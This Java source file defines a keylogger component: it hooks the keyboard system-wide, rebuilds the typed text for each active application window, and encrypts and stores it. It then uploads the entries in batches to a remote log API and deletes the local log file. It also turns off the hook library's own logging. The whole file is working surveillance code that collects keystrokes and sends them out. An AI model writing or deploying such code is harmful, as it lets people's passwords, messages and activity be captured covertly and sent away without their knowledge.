package com.keyguard.javakeyguard.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.keyguard.javakeyguard.api.LogApiService;
import com.keyguard.javakeyguard.keylogger.capture.GlobalKeyListener;
import com.keyguard.javakeyguard.keylogger.context.WindowContextProvider;
import com.keyguard.javakeyguard.keylogger.encryption.EncryptionService;
import com.keyguard.javakeyguard.keylogger.reconstruction.ReconstructionService;
import com.keyguard.javakeyguard.keylogger.storage.LogStorageService;
import com.keyguard.javakeyguard.model.EncryptedLogEntry;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.atomic.AtomicLong;
import java.util.logging.Level;
import java.util.logging.Logger;

@Component
@RequiredArgsConstructor
public class KeyloggerRunner {

    private final EncryptionService encryptionService;
    private final ReconstructionService reconstructionService;
    private final LogStorageService logStorageService;
    private final WindowContextProvider contextProvider;
    private final LogApiService logApiService;

    private final AtomicLong idGenerator = new AtomicLong(1);
    private final String LOG_PATH = "logs/encrypted-log.ndjson";
    private String lastContext = "";

    public void start() {
        disableJNativeHookLogs();
        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new GlobalKeyListener(this));
        } catch (NativeHookException e) {
            throw new RuntimeException("Failed to start native hook", e);
        }
    }

    public void handleKeyPressed(NativeKeyEvent e) {
        String currentContext = contextProvider.getActiveApplication();
        if (currentContext == null || currentContext.isBlank()) {
            currentContext = "Unknown Window";
        }

        if (lastContext.isBlank()) {
            lastContext = currentContext;
        }

        if (!currentContext.equals(lastContext)) {
            flushCurrentBuffer();
            reconstructionService.reset();
            lastContext = currentContext;
        }

        reconstructionService.handleKeyPressed(e);
    }

    public void flushCurrentBuffer() {
        String text = reconstructionService.getCurrentText();
        if (text == null || text.isBlank()) return;

        EncryptedLogEntry entry = new EncryptedLogEntry(
                idGenerator.getAndIncrement(),
                java.time.LocalDateTime.now().toString(),
                encryptionService.encrypt(lastContext),
                encryptionService.encrypt(text)
        );

        logStorageService.save(entry);
    }

    public void printFinalDecryptedLog() {
        flushCurrentBuffer();

        List<EncryptedLogEntry> allEntries = readLogsFromFile();
        if (!allEntries.isEmpty()) {
            logApiService.sendBatch(allEntries);
        }

        encryptionService.printDecryptedLogFile(LOG_PATH);
        cleanupLogFile();
    }

    private List<EncryptedLogEntry> readLogsFromFile() {
        com.fasterxml.jackson.databind.ObjectMapper mapper = new com.fasterxml.jackson.databind.ObjectMapper();
        java.nio.file.Path path = java.nio.file.Path.of(LOG_PATH);

        if (!java.nio.file.Files.exists(path)) return java.util.Collections.emptyList();

        try (java.util.stream.Stream<String> lines = java.nio.file.Files.lines(path)) {
            return lines
                    .filter(line -> !line.isBlank())
                    .map(line -> {
                        try {
                            return mapper.readValue(line, EncryptedLogEntry.class);
                        } catch (Exception e) {
                            return null;
                        }
                    })
                    .filter(java.util.Objects::nonNull)
                    .toList();
        } catch (java.io.IOException e) {
            System.err.println("Could not read logs for upload: " + e.getMessage());
            return java.util.Collections.emptyList();
        }
    }

    private void disableJNativeHookLogs() {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);
    }

    private void cleanupLogFile() {
        try {
            Files.deleteIfExists(Path.of("logs/encrypted-log.ndjson"));
        } catch (IOException e) {
            System.err.println("Failed to clean up log file: " + e.getMessage());
        }
    }
}